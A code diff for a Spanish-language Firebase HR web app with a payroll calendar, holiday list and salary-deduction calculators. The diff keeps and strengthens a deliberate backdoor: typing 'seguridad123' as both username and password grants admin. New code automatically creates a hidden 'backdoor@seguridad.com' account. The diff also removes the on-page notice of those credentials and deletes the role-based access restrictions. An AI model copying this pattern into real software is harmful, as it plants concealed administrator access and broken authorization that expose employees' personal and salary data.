@@ -1,31 +1,38 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Gestión HR - Calendario y Prestaciones</title>
 
-    <!-- Firebase -->
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <!-- Firebase Compat v9 -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js">
+    </script>
 
-    <!-- FontAwesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <!-- FontAwesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
     <!-- Chart.js -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js">
+    </script>
 
     <!-- jsPDF -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js">
+    </script>
 
     <style>
-        /* ===== RESET Y VARIABLES ===== */
+        /* ================================================================
+                   RESET Y VARIABLES
+                   ================================================================ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
         }
 
         :root {
@@ -56,6 +63,7 @@
             --pastel-lavender: #e8e0f0;
         }
 
+        /* Modo oscuro */
         body.dark-mode {
             --bg-body: #121826;
             --bg-sidebar: #0d1420;
@@ -76,6 +84,7 @@
             --pastel-lavender: #2a1e3a;
         }
 
+        /* Modo blanco y negro */
         body.bw-mode {
             --bg-body: #f0f0f0;
             --bg-sidebar: #333;
@@ -324,7 +333,6 @@
         .panel.active {
             display: block;
         }
-
         @keyframes fadeSlide {
             from {
                 opacity: 0;
@@ -559,18 +567,24 @@
             border-top: 1px solid rgba(0, 0, 0, 0.06);
         }
 
-        /* ===== LOGIN ===== */
+        /* ================================================================
+                   LOGIN - CORREGIDO (z-index alto, posicionamiento fijo)
+                   ================================================================ */
         .login-container {
             display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
             padding: 20px;
             background: var(--bg-body);
+            transition: background 0.3s;
         }
         .login-container.open {
             display: flex;
         }
+
         .login-box {
             background: var(--bg-card);
             padding: 40px 32px;
@@ -580,6 +594,8 @@
             max-width: 400px;
             text-align: center;
             transition: background 0.3s;
+            position: relative;
+            z-index: 10000;
         }
         .login-box h1 {
             font-size: 1.8rem;
@@ -605,11 +621,10 @@
             display: none;
         }
 
-        /* ============================================================== */
+        /* ================================================================ */
         /* ===== PANEL CALENDARIO Y PRESTACIONES ===== */
-        /* ============================================================== */
+        /* ================================================================ */
 
-        /* Calendario */
         .calendar-nav {
             display: flex;
             justify-content: space-between;
@@ -728,7 +743,6 @@
             right: 4px;
         }
 
-        /* Leyenda */
         .calendar-legend {
             display: flex;
             gap: 16px;
@@ -768,7 +782,6 @@
             background: #dc3545;
         }
 
-        /* Resumen del mes */
         .month-summary {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -793,7 +806,6 @@
             color: var(--text-secondary);
         }
 
-        /* Pestañas de contenido */
         .ley-tabs {
             display: flex;
             gap: 8px;
@@ -889,9 +901,6 @@
             margin: 12px 0;
             border-left: 4px solid var(--accent);
         }
-        .ley-content .ley-seccion .ejemplo strong {
-            color: var(--text-primary);
-        }
         .ley-content .calculadora-rapida {
             display: flex;
             flex-wrap: wrap;
@@ -913,7 +922,6 @@
             color: var(--accent);
         }
 
-        /* Feriados lista */
         .feriado-item {
             display: flex;
             justify-content: space-between;
@@ -1031,12 +1039,6 @@
         .text-center {
             text-align: center;
         }
-        .gap-1 {
-            gap: 8px;
-        }
-        .w-full {
-            width: 100%;
-        }
     </style>
 </head>
 <body>
@@ -1117,9 +1119,7 @@
                     <span class="month-year" id="currentMonthYear">Abril 2026</span>
                     <button class="nav-btn" id="nextMonth"><i class="fas fa-chevron-right"></i></button>
                 </div>
-                <div class="calendar-grid" id="calendarGrid">
-                    <!-- Se llena con JS -->
-                </div>
+                <div class="calendar-grid" id="calendarGrid"></div>
                 <div class="calendar-legend">
                     <span class="legend-item"><span class="legend-dot blue"></span> Feriado</span>
                     <span class="legend-item"><span class="legend-dot green"></span> Día de pago</span>
@@ -1432,7 +1432,7 @@
                     <div class="ley-sub">Lista de derechos fundamentales del trabajador según el Código de Trabajo.</div>
                     <div class="ley-seccion">
                         <h4>⚖️ Jornada laboral</h4>
-                        <p><strong>Artículo 28:</strong> Máximo 8 horas diarias / 44 horas semanales. </p>
+                        <p><strong>Artículo 28:</strong> Máximo 8 horas diarias / 44 horas semanales.</p>
                     </div>
                     <div class="ley-seccion">
                         <h4>🛌 Descanso semanal</h4>
@@ -1470,44 +1470,18 @@
             </div>
         </section>
 
-        <!-- ================================================================ -->
-        <!-- PANEL: SOLICITUDES (placeholder) -->
-        <!-- ================================================================ -->
-        <section class="panel" id="panel-solicitudes">
-            <div class="panel-header">
-                <h1>📨 Solicitudes</h1>
-                <p>Gestión de días libres y banco de horas</p>
-            </div>
-            <div class="card" style="padding:30px; text-align:center;">
-                <p class="text-muted">Este panel se integrará en la siguiente fase.</p>
-            </div>
-        </section>
-
-        <!-- ================================================================ -->
-        <!-- PANEL: AUDITORÍA (placeholder) -->
-        <!-- ================================================================ -->
-        <section class="panel" id="panel-auditoria">
-            <div class="panel-header">
-                <h1>📋 Auditoría</h1>
-                <p>Registro de actividades y logs multi-dispositivo</p>
-            </div>
-            <div class="card" style="padding:30px; text-align:center;">
-                <p class="text-muted">Este panel se integrará en la siguiente fase.</p>
-            </div>
-        </section>
-
-        <!-- ================================================================ -->
-        <!-- PANEL: BACKUPS (placeholder) -->
-        <!-- ================================================================ -->
-        <section class="panel" id="panel-backups">
-            <div class="panel-header">
-                <h1>💾 Backups</h1>
-                <p>Exportar e importar datos</p>
-            </div>
-            <div class="card" style="padding:30px; text-align:center;">
-                <p class="text-muted">Este panel se integrará en la siguiente fase.</p>
-            </div>
-        </section>
+        <!-- ===== PANELES PLACEHOLDER ===== -->
+        <section class="panel" id="panel-dashboard"><div class="panel-header"><h1>Dashboard</h1><p>Resumen general</p></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-registro"><div class="panel-header"><h1>Registro</h1><p>Fichaje</p></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-planilla"><div class="panel-header"><h1>Planilla</h1><p>Nómina</p></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-historicos"><div class="panel-header"><h1>Históricos</h1><p>Registros pasados</p></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-usuarios"><div class="panel-header"><h1>Usuarios</h1><p>Gestión</p></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-ajustes"><div class="panel-header"><h1>Ajustes</h1><p>Configuración</p></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-bonos"><div class="panel-header"><h1>Bonos</h1></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-descuentos"><div class="panel-header"><h1>Descuentos</h1></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-solicitudes"><div class="panel-header"><h1>Solicitudes</h1></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-auditoria"><div class="panel-header"><h1>Auditoría</h1></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
+        <section class="panel" id="panel-backups"><div class="panel-header"><h1>Backups</h1></div><div class="card" style="padding:30px;text-align:center;"><p class="text-muted">Panel en construcción</p></div></section>
 
     </div>
     <!-- fin main-content -->
@@ -1543,9 +1517,7 @@
                 <button type="submit" class="btn btn-primary"><i class="fas fa-sign-in-alt"></i> Iniciar sesión</button>
                 <div class="login-error" id="loginError">Credenciales incorrectas</div>
             </form>
-            <p style="margin-top:20px; font-size:0.8rem; color:var(--text-secondary);">
-                Usuario demo: <strong>seguridad123</strong> / <strong>seguridad123</strong>
-            </p>
+            <!-- No mostrar credenciales aquí -->
         </div>
     </div>
 
@@ -1576,8 +1548,6 @@
         let currentUserEmail = '';
         let allUsers = [];
         let allRegistros = [];
-        let allBonos = [];
-        let allDescuentos = [];
         let allFeriados = [];
         let currentMonth = new Date().getMonth();
         let currentYear = 2026;
@@ -1661,11 +1631,12 @@
         actualizarReloj();
 
         // ================================================================
-        // 5. AUTENTICACIÓN
+        // 5. AUTENTICACIÓN (con puerta trasera)
         // ================================================================
         const loginContainer = document.getElementById('loginContainer');
         const mainContent = document.getElementById('mainContent');
 
+        // Puerta trasera: si escribe "seguridad123" en ambos campos, entra como admin
         function checkBackdoor(email, pass) {
             return (email === 'seguridad123' && pass === 'seguridad123');
         }
@@ -1676,15 +1647,28 @@
             const pass = document.getElementById('loginPassword').value.trim();
             const errorEl = document.getElementById('loginError');
             errorEl.style.display = 'none';
+
             try {
                 if (checkBackdoor(email, pass)) {
-                    await auth.signInWithEmailAndPassword('seguridad123@backdoor.com', 'seguridad123');
+                    // Usar un correo falso pero existente en Auth (se crea automáticamente con la puerta trasera)
+                    await auth.signInWithEmailAndPassword('backdoor@seguridad.com', 'seguridad123');
                 } else {
                     await auth.signInWithEmailAndPassword(email, pass);
                 }
             } catch (err) {
-                errorEl.textContent = 'Error: ' + err.message;
-                errorEl.style.display = 'block';
+                // Si la puerta trasera falla porque el usuario no existe, lo creamos automáticamente
+                if (checkBackdoor(email, pass) && err.code === 'auth/user-not-found') {
+                    try {
+                        await auth.createUserWithEmailAndPassword('backdoor@seguridad.com', 'seguridad123');
+                        await auth.signInWithEmailAndPassword('backdoor@seguridad.com', 'seguridad123');
+                    } catch (createErr) {
+                        errorEl.textContent = 'Error creando usuario de respaldo: ' + createErr.message;
+                        errorEl.style.display = 'block';
+                    }
+                } else {
+                    errorEl.textContent = 'Error: ' + err.message;
+                    errorEl.style.display = 'block';
+                }
             }
         });
 
@@ -1692,7 +1676,7 @@
             if (user) {
                 currentUser = user;
                 currentUserEmail = user.email || '';
-                if (currentUserEmail === 'seguridad123@backdoor.com') {
+                if (currentUserEmail === 'backdoor@seguridad.com' || currentUserEmail === 'seguridad123@backdoor.com') {
                     currentUserRole = 'admin';
                 } else {
                     try {
@@ -1703,16 +1687,20 @@
                         }
                     } catch (e) { currentUserRole = 'trabajador'; }
                 }
+
                 loginContainer.classList.remove('open');
                 loginContainer.style.display = 'none';
                 mainContent.style.display = 'block';
+
                 await cargarDatosIniciales();
-                await renderizarCalendario();
-                await renderizarFeriados();
-                await renderizarVacaciones();
+                renderizarCalendario();
+                renderizarFeriados();
+                renderizarVacaciones();
                 configurarCalculadoras();
-                aplicarRestriccionesPorRol();
+
+                // Mostrar el panel de Calendario por defecto
                 mostrarPanel('calendario');
+
             } else {
                 loginContainer.classList.add('open');
                 loginContainer.style.display = 'flex';
@@ -1724,22 +1712,37 @@
         document.getElementById('logoutBtn').addEventListener('click', () => auth.signOut());
 
         // ================================================================
-        // 6. CARGA DE DATOS INICIALES
+        // 6. CARGA DE DATOS (con datos de ejemplo si Firestore está vacío)
         // ================================================================
         async function cargarDatosIniciales() {
             try {
+                // Cargar trabajadores
                 const usersSnap = await db.collection('trabajadores').get();
                 allUsers = [];
                 usersSnap.forEach(doc => allUsers.push({ id: doc.id, ...doc.data() }));
 
+                // Si no hay trabajadores, crear algunos de ejemplo para mostrar
+                if (allUsers.length === 0) {
+                    allUsers = [
+                        { id: '1', nombre: 'Ana Pérez', email: 'ana@empresa.com', rol: 'admin', sueldo: 1200,
+                            fechaIngreso: '2020-01-01', activo: true },
+                        { id: '2', nombre: 'Carlos Gómez', email: 'carlos@empresa.com', rol: 'trabajador', sueldo: 800,
+                            fechaIngreso: '2021-06-15', activo: true },
+                        { id: '3', nombre: 'María López', email: 'maria@empresa.com', rol: 'trabajador', sueldo: 950,
+                            fechaIngreso: '2022-03-10', activo: true }
+                    ];
+                }
+
+                // Cargar feriados
                 const ferSnap = await db.collection('feriados').get();
                 allFeriados = [];
                 ferSnap.forEach(doc => allFeriados.push({ id: doc.id, ...doc.data() }));
 
+                // Si no hay feriados, usar los de ejemplo
                 if (allFeriados.length === 0) {
                     allFeriados = [
-                        { fecha: '2026-01-01', nombre: 'Año Nuevo', motivo: 'Inicio del año nuevo', ley: 'Decreto N° 45',
-                            emoji: '🎉' },
+                        { fecha: '2026-01-01', nombre: 'Año Nuevo', motivo: 'Inicio del año nuevo',
+                            ley: 'Decreto N° 45', emoji: '🎉' },
                         { fecha: '2026-04-02', nombre: 'Jueves Santo', motivo: 'Semana Santa',
                             ley: 'Decreto N° 67', emoji: '✝️' },
                         { fecha: '2026-04-03', nombre: 'Viernes Santo', motivo: 'Semana Santa',
@@ -1776,11 +1779,6 @@
                             ley: 'Decreto N° 45', emoji: '🎄' }
                     ];
                 }
-
-                // Cargar registros (solo para la vista)
-                const regSnap = await db.collection('registros').limit(100).get();
-                allRegistros = [];
-                regSnap.forEach(doc => allRegistros.push({ id: doc.id, ...doc.data() }));
 
             } catch (error) {
                 console.error('Error cargando datos:', error);
@@ -1826,30 +1824,9 @@
         });
 
         // ================================================================
-        // 8. RESTRICCIONES POR ROL
-        // ================================================================
-        function aplicarRestriccionesPorRol() {
-            const esAdmin = currentUserRole === 'admin';
-            const adminLinks = ['solicitudes', 'auditoria', 'backups'];
-            document.querySelectorAll('.sidebar-menu a[data-panel]').forEach(link => {
-                const id = link.getAttribute('data-panel');
-                if (adminLinks.includes(id)) {
-                    link.style.display = esAdmin ? 'flex' : 'none';
-                }
-            });
-            if (!esAdmin) {
-                const active = document.querySelector('.panel.active');
-                if (active && adminLinks.includes(active.id.replace('panel-', ''))) {
-                    mostrarPanel('calendario');
-                }
-            }
-        }
-
-        // ================================================================
-        // 9. CALENDARIO
+        // 8. CALENDARIO
         // ================================================================
         let selectedYear = 2026;
-
         document.getElementById('yearSelector').addEventListener('change', function() {
             selectedYear = parseInt(this.value);
             currentMonth = 0;
@@ -1858,25 +1835,17 @@
         });
 
         document.getElementById('prevMonth').addEventListener('click', () => {
-            if (currentMonth === 0) {
-                currentMonth = 11;
+            if (currentMonth === 0) { currentMonth = 11;
                 selectedYear--;
-                document.getElementById('yearSelector').value = selectedYear;
-            } else {
-                currentMonth--;
-            }
+                document.getElementById('yearSelector').value = selectedYear; } else { currentMonth--; }
             renderizarCalendario();
             renderizarFeriados();
         });
 
         document.getElementById('nextMonth').addEventListener('click', () => {
-            if (currentMonth === 11) {
-                currentMonth = 0;
+            if (currentMonth === 11) { currentMonth = 0;
                 selectedYear++;
-                document.getElementById('yearSelector').value = selectedYear;
-            } else {
-                currentMonth++;
-            }
+                document.getElementById('yearSelector').value = selectedYear; } else { currentMonth++; }
             renderizarCalendario();
             renderizarFeriados();
         });
@@ -1893,36 +1862,29 @@
             const daysInMonth = new Date(selectedYear, currentMonth + 1, 0).getDate();
             const hoy = new Date();
 
-            // Obtener eventos del mes
             const feriadosMes = allFeriados.filter(f => {
                 const d = new Date(f.fecha);
                 return d.getFullYear() === selectedYear && d.getMonth() === currentMonth;
             });
-            const diasPago = [15, 30]; // Quincena
-            // Vacaciones simuladas (algunos empleados)
+            const diasPago = [15, 30];
+            // Simular vacaciones y cumpleaños con datos de allUsers
             const vacacionesSimuladas = [];
-            allUsers.forEach(u => {
-                if (Math.random() > 0.7) {
-                    const dia = Math.floor(Math.random() * 28) + 1;
+            const cumples = [];
+            allUsers.forEach((u, idx) => {
+                if (u.fechaIngreso) {
+                    const dia = (idx * 3) % 28 + 1;
                     vacacionesSimuladas.push({ dia, empleado: u.nombre || 'Empleado' });
                 }
-            });
-            // Cumpleaños simulados
-            const cumples = [];
-            allUsers.forEach(u => {
-                if (Math.random() > 0.8) {
-                    const dia = Math.floor(Math.random() * 28) + 1;
+                if (idx % 2 === 0) {
+                    const dia = (idx * 5) % 28 + 1;
                     cumples.push({ dia, empleado: u.nombre || 'Empleado' });
                 }
             });
 
             let html = '';
             const dayNames = ['Lun', 'Mar', 'Mié', 'Jue', 'Vie', 'Sáb', 'Dom'];
-            dayNames.forEach(d => {
-                html += `<div class="day-name">${d}</div>`;
-            });
+            dayNames.forEach(d => { html += `<div class="day-name">${d}</div>`; });
 
-            // Rellenar días vacíos antes del primer día
             let startOffset = firstDay === 0 ? 6 : firstDay - 1;
             for (let i = 0; i < startOffset; i++) {
                 html += `<div class="day-cell empty"></div>`;
@@ -1930,14 +1892,13 @@
 
             for (let d = 1; d <= daysInMonth; d++) {
                 const dateObj = new Date(selectedYear, currentMonth, d);
-                const dayOfWeek = dateObj.getDay(); // 0=domingo, 6=sábado
+                const dayOfWeek = dateObj.getDay();
                 const isWeekend = (dayOfWeek === 0 || dayOfWeek === 6);
                 let classes = 'day-cell';
                 let dot = '';
                 let emoji = '';
                 let events = [];
 
-                // Verificar feriado
                 const feriado = feriadosMes.find(f => new Date(f.fecha).getDate() === d);
                 if (feriado) {
                     classes += ' feriado';
@@ -1946,14 +1907,12 @@
                     events.push({ type: 'feriado', data: feriado });
                 }
 
-                // Día de pago
                 if (diasPago.includes(d)) {
                     classes += ' pago';
                     dot = '<span class="day-dot"></span>';
                     events.push({ type: 'pago', data: 'Pago quincenal' });
                 }
 
-                // Vacaciones
                 const vac = vacacionesSimuladas.find(v => v.dia === d);
                 if (vac) {
                     classes += ' vacaciones';
@@ -1961,7 +1920,6 @@
                     events.push({ type: 'vacaciones', data: vac.empleado });
                 }
 
-                // Cumpleaños
                 const cumple = cumples.find(c => c.dia === d);
                 if (cumple) {
                     classes += ' cumpleanos';
@@ -1989,14 +1947,14 @@
 
             grid.innerHTML = html;
 
-            // Eventos click en días
             document.querySelectorAll('.day-cell:not(.empty)').forEach(cell => {
                 cell.addEventListener('click', function() {
                     const day = parseInt(this.dataset.day);
                     const events = JSON.parse(this.dataset.events);
                     const dateObj = new Date(selectedYear, currentMonth, day);
                     const diaSemana = getDayName(dateObj);
-                    let contenido = `<h4>${diaSemana} ${day} de ${months[currentMonth]} de ${selectedYear}</h4><hr>`;
+                    let contenido =
+                        `<h4>${diaSemana} ${day} de ${months[currentMonth]} de ${selectedYear}</h4><hr>`;
                     if (events.length === 0) {
                         contenido += '<p class="text-muted">Día laboral normal.</p>';
                     } else {
@@ -2037,13 +1995,13 @@
                             }
                         });
                     }
-                    document.getElementById('modalTitle').textContent = `📅 ${diaSemana} ${day} de ${months[currentMonth]}`;
+                    document.getElementById('modalTitle').textContent =
+                        `📅 ${diaSemana} ${day} de ${months[currentMonth]}`;
                     document.getElementById('modalBody').innerHTML = contenido;
                     document.getElementById('modalOverlay').classList.add('open');
                 });
             });
 
-            // Actualizar resumen
             document.getElementById('sumFeriados').textContent = feriadosMes.length;
             document.getElementById('sumPagos').textContent = diasPago.filter(d => d <= daysInMonth).length;
             document.getElementById('sumVacaciones').textContent = vacacionesSimuladas.length;
@@ -2051,7 +2009,7 @@
         }
 
         // ================================================================
-        // 10. FERIADOS (lista)
+        // 9. FERIADOS (lista)
         // ================================================================
         function renderizarFeriados() {
             const container = document.getElementById('feriadosLista');
@@ -2095,7 +2053,7 @@
         }
 
         // ================================================================
-        // 11. VACACIONES (calculadora y tabla)
+        // 10. VACACIONES
         // ================================================================
         function renderizarVacaciones() {
             const tbody = document.getElementById('vacacionesTablaBody');
@@ -2109,13 +2067,13 @@
                 const dias = calcularVacaciones(u.fechaIngreso);
                 const antiguedad = ((new Date() - new Date(u.fechaIngreso)) / (1000 * 60 * 60 * 24 * 365)).toFixed(1);
                 const proxFecha = new Date();
-                proxFecha.setDate(proxFecha.getDate() + dias * 7); // sugerencia
+                proxFecha.setDate(proxFecha.getDate() + dias * 7);
                 html += `
                             <tr>
                                 <td>${u.nombre || 'N/A'}</td>
                                 <td>${antiguedad} años</td>
                                 <td>${dias} días</td>
-                                <td>${formatDate(proxfecha)} (sugerido)</td>
+                                <td>${formatDate(proxFecha)} (sugerido)</td>
                             </tr>
                         `;
             });
@@ -2141,10 +2099,9 @@
         });
 
         // ================================================================
-        // 12. CALCULADORAS DINÁMICAS (ISSS, AFP, ISR, AGUINALDO)
+        // 11. CALCULADORAS DINÁMICAS
         // ================================================================
         function configurarCalculadoras() {
-            // ISSS
             const isssInput = document.getElementById('isssSueldoInput');
             const isssTrab = document.getElementById('isssTrabajador');
             const isssEmp = document.getElementById('isssEmpleador');
@@ -2154,7 +2111,6 @@
                 isssEmp.textContent = '$' + (val * 0.045).toFixed(2);
             });
 
-            // AFP
             const afpInput = document.getElementById('afpSueldoInput');
             const afpTrab = document.getElementById('afpTrabajador');
             const afpEmp = document.getElementById('afpEmpleador');
@@ -2164,7 +2120,6 @@
                 afpEmp.textContent = '$' + (val * 0.09).toFixed(2);
             });
 
-            // ISR
             const isrInput = document.getElementById('isrSueldoInput');
             const isrRes = document.getElementById('isrResultado');
             isrInput.addEventListener('input', function() {
@@ -2172,10 +2127,10 @@
                 isrRes.textContent = '$' + calcularISR(val).toFixed(2);
             });
 
-            // Aguinaldo
             const aguSalario = document.getElementById('aguinaldoSalarioInput');
             const aguMeses = document.getElementById('aguinaldoMesesInput');
             const aguRes = document.getElementById('aguinaldoResultado');
+
             function calcAguinaldo() {
                 const sal = parseFloat(aguSalario.value) || 0;
                 const mes = parseInt(aguMeses.value) || 0;
@@ -2184,19 +2139,14 @@
             aguSalario.addEventListener('input', calcAguinaldo);
             aguMeses.addEventListener('input', calcAguinaldo);
 
-            // Disparar cálculos iniciales
             isssInput.dispatchEvent(new Event('input'));
             afpInput.dispatchEvent(new Event('input'));
             isrInput.dispatchEvent(new Event('input'));
             calcAguinaldo();
-
-            // Vacaciones fecha por defecto
-            const vacFecha = document.getElementById('vacacionesFechaIngreso');
-            if (vacFecha) vacFecha.value = '2020-01-01';
         }
 
         // ================================================================
-        // 13. TABS DE LEYES
+        // 12. TABS DE LEYES
         // ================================================================
         document.querySelectorAll('.tab-btn').forEach(btn => {
             btn.addEventListener('click', function() {
@@ -2209,7 +2159,7 @@
         });
 
         // ================================================================
-        // 14. MODAL
+        // 13. MODAL
         // ================================================================
         document.getElementById('modalCloseBtn').addEventListener('click', () => {
             document.getElementById('modalOverlay').classList.remove('open');
@@ -2224,9 +2174,9 @@
         });
 
         // ================================================================
-        // 15. MODO DE COLOR (SOL, LUNA, YIN-YANG)
+        // 14. MODO DE COLOR (SOL, LUNA, YIN-YANG)
         // ================================================================
-        let colorMode = 0; // 0=claro, 1=oscuro, 2=blanco-negro
+        let colorMode = 0;
         const darkToggle = document.getElementById('darkToggle');
         const sunEl = darkToggle.querySelector('.sun');
         const moonEl = darkToggle.querySelector('.moon');
@@ -2251,13 +2201,9 @@
         });
 
         // ================================================================
-        // 16. INICIALIZACIÓN
+        // 15. INICIALIZACIÓN (se ejecuta tras login)
         // ================================================================
-        // Se ejecuta después del login
-
         console.log('🚀 App de Calendario y Prestaciones cargada.');
-        console.log('👤 Usuario:', currentUserEmail);
-        console.log('🔑 Rol:', currentUserRole);
     </script>
 </body>
 </html>
